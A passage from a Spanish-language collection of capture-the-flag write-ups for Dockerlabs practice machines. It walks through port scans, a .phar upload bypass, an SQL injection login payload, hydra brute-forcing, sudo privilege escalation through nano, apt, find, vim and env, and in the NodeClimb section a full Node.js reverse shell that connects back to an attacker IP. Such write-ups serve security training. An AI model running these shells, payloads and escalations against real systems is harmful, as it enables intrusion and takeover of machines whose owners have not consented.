![9](/assets/img/writeups/FirstHacking/9.png)

- Y somos root directamente!!

![10](/assets/img/writeups/FirstHacking/10.png)

---

# [Hidden](#índice-de-máquinas-resueltas-)

![27](/assets/img/writeups/Hidden/27.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/EO8DzKgR#V3Vj8pWT6dUfWP03Zi2ZNs-o3uztnrTd1qGxvnn3oHo)

### ¿Qué trabajamos con esta máquina?

- Fuzzing de rutas subdominios
- File Upload
- Revshell
- Fuerza bruta
- Explotación de los binarios (nano, apt, find)

### Fase de Reconocimiento

- Vemos que hay conectividad con la máquina y sabemos que es Linux por el **TTL**, que es **64**. Aunque no siempre es fiable.

![2](/assets/img/writeups/Hidden/2.png)

- Usamos la herramienta **nmap** para el escaneo de puertos.

`sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN all`

- Este comando lo que hace es buscar todos los puertos abiertos (1-65535) (`-p-`), lo hace de manera sigilosa (`-sS`), busca la versión de los servicios ( `-sV`), de manera rápida(`--min-rate=5000`), desactiva la resolución DNS para evitar problemas(`-n`), utiliza triple verbose para que tengamos más detalle del escaneo (`-vvv`)y omite la detección de host(`-Pn`). Lo guarda en el fichero all (`-oN all`).

![3](/assets/img/writeups/Hidden/3.png)

- Puerto **80 -> HTTP**

### Fase de Explotación

- Como podemos ver, la página no resuelve ya que comprobamos con el reporte de **nmap** que tiene un dominio llamado **hidden.lab**.
Por los tanto lo añadimos al fichero /etc/hosts.

![4](/assets/img/writeups/Hidden/4.png)

- Ahora sí vemos que resuelve bien la página.

![5](/assets/img/writeups/Hidden/5.png)

#### Fuzzing

- Para empezar hago fuzzing para conocer directorios que cuelguen de la raiz pero veo que no hay ninguno relevante por lo que se me ocurre a hacer fuzzing de subdominios con la herramienta **wfuzz** y encuentro el siguiente.

`wfuzz -c --hl=9 -w /usr/share/wordlist/SecLists/Discovery/DNS/subdomain-top1million-110000.txt -H "Host:FUZZ.hidden.lab" -u 172.17.0.3`

![6](/assets/img/writeups/Hidden/6.png)

- Y lo volvemos a añadir al fichero **/etc/hosts** para que pueda resolver bien.

![7](/assets/img/writeups/Hidden/7.png)

- Vemos que podemos subir archivos, pero solo con extensión PDF.

![8](/assets/img/writeups/Hidden/8.png)

- Busco por Internet extensiones que permitan **php** y tras probar extensiones encuentro en HackTricks la extensión [**.phar**](https://book.hacktricks.xyz/pentesting-web/file-upload).

- Por lo que puedo usar la herramienta [**php-reverse-shell**](https://github.com/pentestmonkey/php-reverse-shell) para conseguir una reverse shell.

- Editamos el archivo y ponemos en la IP, la nuestra, la de Kali Linux, es decir, la atacante, y el puerto que vamos a utilizar, en mi caso, el **443**.

![9](/assets/img/writeups/Hidden/9.png)

- Y ahora le cambiamos la extensión e intentamos subirlo. Para cambiar la extensión podemos hacer uso del **mv**

`mv php-reverse-shell.php  php-reverse-shell.phar`

- ¡¡ IMPORTANTE !!

- Es importante que en la esquina inferior derecha pongais todos los archivos, porque sino, no os saldrá.

![10](/assets/img/writeups/Hidden/10.png)

- Una vez subido, tenemos que saber donde se ha subido, para ello podemos volver a hacer fuzzing con el nuevo subdominio para saber donde se ha subido.

![11](/assets/img/writeups/Hidden/11.png)

- Entramos y vemos que si está ahí subido, entonces ahora hacemos uso del **nc** para obtener la reverse shell.

![12](/assets/img/writeups/Hidden/12.png)

- Y si se queda cargando significa que la hemos obtenido.

![13](/assets/img/writeups/Hidden/13.png)

#### [🔗 Link Github Alv-fh -> [sanitizar TTY]](https://github.com/Alv-fh/tty_treatment)

![14](/assets/img/writeups/Hidden/14.png)

- Tras intentar buscar binarios con permisos SUID, hacer uso del `sudo -l` etc, no encuentro nada y decido hacer ataque de fuerza bruta con usuarios del sistema.

![15](/assets/img/writeups/Hidden/15.png)

- Vemos que existen **cafetero, john, bobby**.

- Subimos un script en bash que hace ataque de fuerza bruta con diccionario, para ello, he acortado el rockyou.txt a 200 palabras ya que no me dejaba subirlo más grande.

`head -n 200 rockyou.txt > rockyou_200.txt`

- Subimos el diccionario.

- El script que voy a utilizar es este -> [Linux-Su-Force](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)

- Subimos el script.

![16](/assets/img/writeups/Hidden/16.png)

- Ahora volvemos a la reverse shell y ejecutamos el script.

- Le damos permisos y ejecutamos.

`chmod +x Linux-Su-Force.sh`

`bash Linux-Su-Force.sh cafetero rockyou_200.txt`

![17](/assets/img/writeups/Hidden/17.png)

- Ahora entramos como cafetero y vemos que podemos usar con **sudo**.

![18](/assets/img/writeups/Hidden/18.png)

- Hago uso de la herramienta [Searchbins](https://github.com/r1vs3c/searchbins) que está basada en la página [GTFOBins](https://gtfobins.github.io/).

![19](/assets/img/writeups/Hidden/19.png)

- Y lo ponemos en práctica.

![14](/assets/img/writeups/Hidden/20.png)

`sudo -u john /usr/bin/nano`

`^R -> (Ctrl R) ^X -> (Ctrl X`

`reset; sh 1>&0 2>&0`

- Vemos que funciona, así que ahora vamos a por el siguiente usuario.

![21](/assets/img/writeups/Hidden/21.png)

- Hacemos uso de la herramienta.

![22](/assets/img/writeups/Hidden/22.png)

`sudo -u bobby /usr/bin/apt changelog apt`

`!/bin/sh`

- Probamos el primero...

![23](/assets/img/writeups/Hidden/23.png)

- Ganamos acceso a bobby. Vamos a por el siguiente que ya es root.

![24](/assets/img/writeups/Hidden/24.png)

- Vemos que podemos ejecutar como root el binario find, por lo que buscamos en nuestra herramienta.

`sudo -u root /usr/bin/find . -exec /bin/sh -p \\; -quit`

![25](/assets/img/writeups/Hidden/25.png)

- Y vemos que funciona correctamente.

![26](/assets/img/writeups/Hidden/26.png)

- Ya somos root!!

---

# [HiddenCat](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/HiddenCat/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/oSMDFTwS#RuwOzB6pGIQN87FpC4vJ4K8trWJajo55RilJ8EOBsVA)

### ¿Qué trabajamos con esta máquina?

- Apache Tomcat
- Fuerza bruta
- Explotación SUID (python)

### Fase de Reconocimiento

- Comprobamos que tenemos conectividad y que el TTL es de 64, por lo que se trata de una máquina Linux.

![2](/assets/img/writeups/HiddenCat/2.png)

- Hacemos un escaneo simple con nmap para averigurar que puertos y servicios corren, también descubriremos la versión.

![3](/assets/img/writeups/HiddenCat/3.png)

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22 | SSH | 7.9p1 |
| 8009 | Apache Jserv | 1.3 |
| 8080 | Apache Tomcat | 9.0.30 |

- Buscamos en el Navegador y aparece esto:

![4](/assets/img/writeups/HiddenCat/4.png)

- Busco en **Metasploit** el servicio y la versión y encuentro este exploit que es el que mejor pinta tiene. En un entorno real probariamos uno a uno a no ser que filtremos por versión.

![6](/assets/img/writeups/HiddenCat/6.png)

- Vemos lo que nos pide.

![7](/assets/img/writeups/HiddenCat/7.png)

- Ponemos en:

**RHOSTS -> IP objetivoRPORT -> 8009**

![1](/assets/img/writeups/HiddenCat/8.png)

**run** y vemos que hay un mensaje de bienvenida, en el que hay un usuario.  **jerry**.

![9](/assets/img/writeups/HiddenCat/9.png)

- Utilizamos hydra para hacer un ataque de fuerza bruta por SSH ya que ese puerto lo tenemos abierto.

`hydra -l jerry -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -t 64 -I`

![10](/assets/img/writeups/HiddenCat/10.png)

- Vemos que la clave es *chocolate*. Un clásico del Pingüino de Mario, ajajaja. Entramos y buscamos para poder ser root.

![11](/assets/img/writeups/HiddenCat/11.png)

- Vemos que podemos ejecutar con permisos SUID el binario python. Por lo que buscamos en nuestra herramienta [searchbins](https://github.com/r1vs3c/searchbins).

![12](/assets/img/writeups/HiddenCat/12.png)

- Entonces lo ejecutamos en la máquina y...

![13](/assets/img/writeups/HiddenCat/13.png)

- Ya somos root!!

---

# [Inyection](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/Inyection/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/wLN2nQ7B#p0YzUFAsrE3ilnJ9HzMr1hfsUq2DPYiDHlIU_9IEizU)

### ¿Qué trabajamos con esta máquina?

- SQL Inyection
- Explotación SUID binario (env)

### Fase de Reconocimiento

- Al desplegar la máquina nos da la IP, por lo que le hacemos ping y vemos que el TTL es de 64, lo que nos indica que es una máquina Linux.

![2](/assets/img/writeups/Inyection/2.png)

- Hacemos un escaneo de tipo SYN para descubrir los puertos abiertos de una manera rápida.

`sudo nmap -p- -sS --min-rate=5000 -n -Pn 172.17.0.2 -oN Puertos.txt`

- p- > Puertos abiertos

-sS > Escaneo de tipo SYN, es un escaneo rápido y sigiloso

--min-rate=5000 > Muestre paquetes no más lentos que 5000 paquetes por segundo

-n > Desactive la resolución DNS

-Pn > Desactive la resolución de ARP (Host) porque sabemos que este host existe en la red

-oN > Formato normal de nmap.

![3](/assets/img/writeups/Inyection/3.png)

| Puerto | Servicio |
| --- | --- |
| 22/TCP | SSH |
| 80/TCP | HTTP |

### Fase de Explotación

- Al entrar en la Web vemos un panel de login

![4](/assets/img/writeups/Inyection/4.png)

- Probamos con credenciales típicas como **admin:admin** pero no conseguimos entrar por lo que probamos a hacer:

#### SQL Inyection

- Probamos con una consulta básica para realizar SQL Inyection

`' OR 1=1;-- -`

- Password: LAQUESEA

![5](/assets/img/writeups/Inyection/5.png)

- Y conseguimos entrar.

- Ahora vemos que hay un usuario llamado dylan y una password KJSDFG789FGSDF78

dylan:KJSDFG789FGSDF78

![6](/assets/img/writeups/Inyection/6.png)

- Recordamos el puerto 22 SSH que estaba abierto por lo que intentamos entrar.

![7](/assets/img/writeups/Inyection/7.png)

### Escalada de Privilegios

- Intentamos buscar binarios que se puedan ejecutar como otro usuario pero no podemos, entonces buscamos binarios con permisos SUID.

`find / -perm -4000 2>/dev/null`

![9](/assets/img/writeups/Inyection/9.png)

- Y encontramos el binario **env**

- Buscamos en GTFOBins y nos sale esto

![10](/assets/img/writeups/Inyection/10.png)

Por lo que lo probamos...

![8](/assets/img/writeups/Inyection/8.png)

Y conseguimos ser root!

---

# [Move](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/Move/19.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/MKMzkSRA#UCxX3Ns2Ew_YQlayKPyyi6rmQrRbySxC7hhpWJfMoy8)

### ¿Qué trabajamos con esta máquina?

- Fuzzing
- Grafana
- FTP Anonymous
- Keepassxc
- Explotación binario (Python)

### Fase de Reconocimiento

- Vemos que hay conectividad con la máquina y sabemos que es Linux por el **TTL**, que es **64**.

![2](/assets/img/writeups/Move/2.png)

- Usamos la herramienta **nmap** para el escaneo de puertos.

`sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN puertos`

- Este comando lo que hace es buscar todos los puertos abiertos (1-65535) (`-p-`), lo hace de manera sigilosa (`-sS`), busca la versión de los servicios ( `-sV`), de manera rápida(`--min-rate=5000`), desactiva la resolución DNS para evitar problemas(`-n`), utiliza triple verbose para que tengamos más detalle del escaneo (`-vvv`)y omite la detección de host(`-Pn`). Lo guarda en el fichero allPorts (`-oN puertos`).

![31](/assets/img/writeups/Move/3.png)

- Puertos **abiertos**

- Puerto **21 -> FTP**

- Puerto **22 -> SSH**

- Puerto **80 -> HTTP**

- Puerto **3000 -> Grafana**

### Fase de Explotación

#### Fuzzing

-  Si hacemos fuzzing con **gobuster** vemos que encuentra un archivo llamado **maintenance.html**.

![4](/assets/img/writeups/Move/4.png)

- Lo buscamos en el navegador.

![5](/assets/img/writeups/Move/5.png)

#### Grafana

- Si buscamos en el navegador la IP de la máquina por el puerto 3000, vemos que está corriendo un [Grafana](https://grafana.com/).

![6](/assets/img/writeups/Move/6.png)

- Buscamos un exloit para la version **8.3.0** ya que vemos en la parta inferior que utiliza esa versión.

![7](/assets/img/writeups/Move/7.png)

- Vemos que lo único que tenemos que poner es la flag **-H** y la IP. También indicaremos el puerto **3000** que es por donde está corriendo [Grafana](https://grafana.com/). Y este exploit lo que hace es leer archivos del sistema.

![8](/assets/img/writeups/Move/8.png)

- Vemos que existe un usuario llamado **freddy**.

- Podriamos intentar con la herramienta **hydra** hacer un ataque de fuerza bruta pero por ahí no van los tiros.

- Si recordamos, tenemos el puerto **21** abierto, y en el reporte de **nmap** vemos que podemos entrar como **Anónimo**.

![9](/assets/img/writeups/Move/9.png)

- Si buscamos en internet vemos que el archivo **database.kdbx** se puede desencriptar con [Keepassxc](https://keepassxc.org/).

- Si recordamos, nos salía haciendo **fuzzing** un archivo llamado **maintenance.html**, en el que dice que el sitio web está en mantenimiento, que acceda a **/tmp/pass.txt**.

- Si volvemos a utilizar el exploit de python...

![10](/assets/img/writeups/Move/10.png)

- Entonces tiene pinta de que es la clave para poder acceder a la base de datos. Utilizamos la aplicación.

![11](/assets/img/writeups/Move/11.png)

- Y vemos la clave de freddy. Por lo que podemos probar por SSH ya que si recordamos, el puerto estaba abierto.

![12](/assets/img/writeups/Move/12.png)

- Entramos con freddy y vemos que está corriendo un Kali Linux.

- Lo siguiente es entrar con root.

![13](/assets/img/writeups/Move/13.png)

- Vemos que podemos ejecutar como cualquier usuario el script de python llamado [maintenance.py](http://maintenance.py/).

![14](/assets/img/writeups/Move/14.png)

- Entramos en él para ver lo que hay.

![15](/assets/img/writeups/Move/15.png)

- A través de la herramienta [Searchbins](https://github.com/r1vs3c/searchbins) que está basada en la página [GTFOBins](https://gtfobins.github.io/).

- Vemos que podemos editar el archivo por lo que podemos hacernos una shell importando la librería **os**.

![16](/assets/img/writeups/Move/16.png)

- Por lo que lo hacemos en el script.

![17](/assets/img/writeups/Move/17.png)

- Y vemos que al ejecutarlo funciona correctamente.

![18](/assets/img/writeups/Move/18.png)

- Ya somos root!!

---

# [NodeClimb](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/NodeClimb/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/4b1ymaiL#xBg29RY4Qo6U9rJLTtSjgUOX2BWTGd-qSfYEpDEMdQs)

### ¿Qué trabajamos con esta máquina?

- FTP Anonymous
- Crackear Hash de un .zip con zip2jhon y john
- Revshell con javascript

### Fase de Reconocimiento

- Vemos que al desplegar la máquina nos da una IP, así que hacemos un ping y comprobamos la conectividad.

![3](/assets/img/writeups/NodeClimb/3.png)

- Hacemos ping y vemos que tenemos conectividad

![4](/assets/img/writeups/NodeClimb/4.png)

- Lanzo un escaneo con `nmap` y compruebo lo siguiente:

`nmap -p- -sS -sC -sV -O 172.17.0.2 -oN puertos.txt`

![5](/assets/img/writeups/NodeClimb/5.png)

#### Puertos y Servicios

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 21 | FTP | Vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 9.2p1 |

### Fase de Explotación

- Vemos que podemos entrar como **anonymous** en FTP y que hay un archivo ZIP. Nos los traemos a nuestra máquina con el comando get.

![5](/assets/img/writeups/NodeClimb/5.png)

- Lo abrimos y a simple vista veo que hay un .txt con la clave para entrar por SSH.

![6](/assets/img/writeups/NodeClimb/6.png)

- Si lo intentamos extraer nos pide una clave, pero no la sabemos.

- Podemos convertir el fichero a un hash para luego con john hacer fuerza bruta para sacar la clave del .zip.

`zip2jhon secretitopicaron.zip > secretitohash`

![7](/assets/img/writeups/NodeClimb/7.png)

- Ahora con `jhon` intentamos sacar la clave.

`john --format=PKZIP -w /usr/share/wordlist/rockyou.txt secretitohash`

![8](/assets/img/writeups/NodeClimb/8.png)

- Y vemos que la clave es *password1*

- Lo intentamos extraer y vemos que si nos deja, abrimos el password.txt y sale esto.

![9](/assets/img/writeups/NodeClimb/9.png)

- Por lo que entramos por SSH y vemos que podemos ejecutar como cualquier usuario el binario node pero solo el script que hay en /home/mario.

![10](/assets/img/writeups/NodeClimb/10.png)

- Si abrimos el script, vemos que está vacido. Podemos meter una reverse shell y ejecutarla como root para conseguir privilegios.

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "192.168.1.246", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

```

- En la máquina atacante, en nuestro kali, ejecutamos primero:

`nc -nlvp 443`

- Y luego ejecutamos el script

- Si se queda colgado y en nuestra máquina conseguimos la bash lo hemos hecho bien.

- Ahora ejecutamos `whoami` y vemos que somos root.

![11](/assets/img/writeups/NodeClimb/11.png)

- Ya somos root!!

---

# [SecretJenkins](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/SecretJenkins/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/wbEwUBRY#z7bH1Hj9-6tsD2G0ji0tBujUbFaE7w8W3YhvV0MpMQs)

### ¿Qué trabajamos con esta máquina?

- Explotación de Jenkins
- Fuerza bruta
- Explotación del binario (Python)

### Fase de Reconocimiento

- Comprobamos que sí tenemos conectividad con la máquina y que el **TTL** es 64 por lo que hablamos de una máquina Linux.

![2](/assets/img/writeups/SecretJenkins/2.png)

- Utilizamos la herramienta **nmap** y vemos los puertos abiertos.

![3](/assets/img/writeups/SecretJenkins/3.png)

22 -> SSH

8080 -> Jenkins

### Fase de Explotación

- Con la herramienta [nuclei](https://github.com/projectdiscovery/nuclei) sacamos la versión -> 2.441

![4](/assets/img/writeups/SecretJenkins/4.png)

- Buscamos en internet y vemos que en Eploitdb hay un exploit de LFI en Python. Nos lo descargamos y vemos como funciona.

![5](/assets/img/writeups/SecretJenkins/5.png)

- Con el `-h` vemos como funciona.

![6](/assets/img/writeups/SecretJenkins/6.png)

- Vemos que se podemos ver el **/etc/passwd** y conocemos nuevos usuarios.

![7](/assets/img/writeups/SecretJenkins/7.png)

- Recordamos que tenemos el puerto 22 abierto, por lo que podemos hacer un ataque de diccionario con **hydra**.

- Pruebo con el usuario **pinguinito** pero no consigo sacarla, así que pruebo con el usuario **bobby** y la encuentro.

![8](/assets/img/writeups/SecretJenkins/8.png)

- Entro por SSH y veo que puedo ejecutar el binario **python3** con **pinguinito**

![9](/assets/img/writeups/SecretJenkins/9.png)

- Busco en la herramienta [searchbins](https://github.com/r1vs3c/searchbins). y encontramos esto.

![10](/assets/img/writeups/SecretJenkins/10.png)

- Entramos como pinguinito pero como sale en pantalla para evitar problemas y vemos que podemos ejecutar un script como cualquier usuario.

![11](/assets/img/writeups/SecretJenkins/11.png)

- Intentamos escribir en el script pero nos deniega el permiso.

- Vemos que el propietario del script es **pinguinito** por lo que podemos intentar darle permisos de escritura.

![12](/assets/img/writeups/SecretJenkins/12.png)

- Vemos que si nos deja con el comando `chmod +w /opt/script.py`

- Entonces ahora probamos a añadir esta línea. Que es lo que habíamos hecho antes, pero ahora lo añadimos al script. Esto básicamente lo que hace es importar una librería llamada os, que puede ejecutar comandos del sistema operativo, y ejecuta una bash, entonces al ejecutarla como root, pues la bash es de root.

![13](/assets/img/writeups/SecretJenkins/13.png)

- Entonces la ejecutamos y...

![14](/assets/img/writeups/SecretJenkins/14.png)

- Ya somos root!!

---

# [Trust](#índice-de-máquinas-resueltas-)

![1](https://github.com/user-attachments/assets/b93aa5be-e943-464e-80e6-e4d5d7721685)

#### [🔗 **Link de Descarga**](https://mega.nz/file/wD9BgLDR#784mjg4xwoolyyKMqdGLk1_YntbJLItJ7RFRx9A69ZE)

### ¿Qué trabajamos con esta máquina?

- Fuzzing
- Fuerza bruta
- Explotación del bionario (vim)

### Fase de Reconocimiento

- Comprobamos que tenemos conectividad y vemos que tiene **ttl 64**, por lo que se trata de máquina Linux. Aunque no siempre es así.

![2](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/9c210269-1707-409b-b54c-d13bfbee5415)

- Utilizamos la herramienta **nmap** para escanear los puertos abiertos.

`sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN puertos`

- Este comando lo que hace es buscar todos los puertos abiertos (1-65535) (`-p-`), lo hace de manera sigilosa (`-sS`), busca la versión de los servicios ( `-sV`), de manera rápida(`--min-rate=5000`), desactiva la resolución DNS para evitar problemas(`-n`), utiliza triple verbose para que tengamos más detalle del escaneo (`-vvv`)y omite la detección de host(`-Pn`). Lo guarda en el fichero allPorts (`-oN allPorts`).

![3](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/6059c2fc-aac3-45c8-8898-3b6913ee5de7)

Puertos **abiertos**
Puerto **80 -> HTTP**
Puerto **22 -> SSH**

#### Fuzzing

- Hacemos fuzzing al puerto 80 para ver si cuelga algun directorio o archivo de la raiz.

![4](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/9cc6c4a6-126f-45bb-b634-5b91ee77efd8)

- Si buscamos el archivo encontrado, sale esto.

![5](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/8b54546a-74cb-4df7-a7fe-a18196c752ba)

- Parece que **mario** es un usuario.

- Tenemos otra posibilidad de ataque, que es por SSH.

#### Hydra

- Utilizamos **hydra** para hacer un ataque de diccionario por SSH.

![6](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/2fdeb621-5987-491f-a041-4a8c3332666e)

- Entramos y vemos que podemos ejecutar el comando **vim**, que es un editor de texto.

![7](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/f3fcd5b9-9a9f-443c-a934-dd4b91ba8965)

- Sabemos que para poder empezar a escribir en vim, necesitamos poner `:`

- Vemos que al abrir vim podemos crear una shell si ponemos `!/bin/bash`, acompañado de los dos puntos.

![8](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/dc53e16f-e447-4dc9-b235-87cb197472c3)

- Y ya somos root!!

---

# [Upload](#índice-de-máquinas-resueltas-)

![1](https://github.com/user-attachments/assets/1a24ac12-b972-42e6-b824-2f3b529b29d4)

#### [🔗 **Link de Descarga**](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ)

### ¿Qué trabajamos con esta máquina?

- Fuzzing
- Upload Files 
- Reverse Shell
- Explotación del binario (env)

### Fase de Reconocimiento

Vemos que hay conectividad con la máquina y sabemos que es Linux por el **TTL**, que es **64**.

![2](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/fc24939f-220f-4310-860c-0133105c905f)

- Usamos la herramienta **nmap** para el escaneo de puertos.

`sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN abiertos`

- Este comando lo que hace es buscar todos los puertos abiertos (1-65535) (`-p-`, lo hace de manera sigilosa (`-sS`), busca la versión de los servicios ( `-sV`), de manera rápida(`--min-rate=5000`), desactiva la resolución DNS para evitar problemas(`-n`), utiliza triple verbose para que tengamos más detalle del escaneo (`-vvv`)y omite la detección de host(`-Pn`). Lo guarda en el fichero allPorts (`-oN allPorts`).

![3](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/6325e4c3-4c66-4f37-8a8f-13ae1cadf981)

Puertos **abiertos**

Puerto **80 -> HTTP**

#### Fuzzing

- Utilizamos la herramienta **gobuster** para encontrar directorios y archivos.

![4](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/9d087f2a-f92c-42f4-9b97-57289f531834)

- Vemos que al buscar el **upload.php** sale esto.

![5](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/af42f71d-8c3f-4cd1-a9c4-c605eaf6b876)

#### Reverse shell

- Vemos que podemos subir archivos, por lo que podemos subir una reverse shell para ganar acceso.

![6](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/51f3fdfc-762e-4743-9a28-98cfde8c3285)

- Ahora buscamos donde se ha subido la reverse shell. Si miramos en los directorios que ha encontrado **gobuster**, vemos que hay un directorio llamado **uploads**.

![7](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/88c2d777-226d-49b5-a74f-24e020bc776e)

- En este caso voy a utilizar el puerto **443** en escucha. Y la IP, es la nuestra, la de Kali Linux.

![8](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/d38ac2fa-549d-4170-b367-822a1916649e)

`nc -nlvp 443`

![9](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/e87bf22d-53bf-4735-b98d-ec8d531b7ef6)

### Escalada de privilegios

- Vemos que podemos ejecutar como **root** el comando **env**

![10](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/e1edf513-43a7-43ac-a6cf-a06de6f272d0)

- Entonces podemos hacer lo siguiente para conseguir una shell como root.

![11](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/e202f8c0-df8a-48f8-9379-f388a29d4030)

- Y ya somos root!!

---

# [Vacaciones](#índice-de-máquinas-resueltas-)

![1](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/0f957329-b9f8-45de-b7a3-360ebff019cc)

#### [🔗 **Link de Descarga**](https://mega.nz/file/YCEGAISD#y6iWUG_auH4vUApClb9ix7H6JmOCKm4vAYS2TjQn59g)

### ¿Qué trabajamos con esta máquina?

- Fuerza bruta
- Explotación del binario (ruby)

### Fase de Reconocimiento

- Comprobamos que sí tenemos conectividad con la máquina y que el **TTL** es 64 por lo que hablamos de una máquina Linux.

![2](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/b83a7251-0fbd-481d-85d3-4a5f256a4360)

- Utilizamos la herramienta **nmap** y vemos los puertos abiertos.

![3](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/cfa2d345-916a-425c-8099-4284ca56d802)

22 -> SSH

80 -> HTTP

![4](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/7eb41302-02f8-461a-88d0-91d052e58096)

- Veo al inspeccionar la página esto por lo que pueden ser usuarios. Vamos a probar con hydra.

- Encontramos la clave de **camilo**

![5](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/b00f73cc-9789-430f-8878-714d464a41ec)

- Consigo entrar y consigo una bash con el comando.

`script /dev/null -c bash`

![6](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/1ca70a61-207a-49e3-9ea9-3805906e3985)

- Antes vimos que ponía que nos había dejado un correo por lo que voy a buscar algún archivo .txt y encuentro el siguiente:

![7](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/8c43c0d2-ef92-42b5-8933-4d83c0e8e805)

- Por lo que decido verlo y sale esto:

![8](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/f989795b-e4cf-4bd1-a61a-a5515ce3c55c)

- Entro como Juan y vuelvo a conseguir la bash.

![9](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/cab6d1df-7abf-4f43-ab17-5141a39f2d64)

- Veo que puedo ejecutar como cualquier usuario el binario **ruby**

![10](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/7441ca26-1eb8-4bc6-9d32-51a0f83b651e)

- Busco en mi herramienta **searchbins** y me aparece esto.

![11](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/4d0ad93d-322d-48ed-9741-1d6f4f663c08)

- Lo ejecutamos así para que no hay problemas ya que forzamos que lo ejecute como root, además debemos poner la ruta absoluta del binario.

![12](https://github.com/Alv-fh/Dockerlabs_machines_writeups/assets/109484163/6959481d-f28d-4e1c-9124-4ff2668899ed)

- Ya somos root!!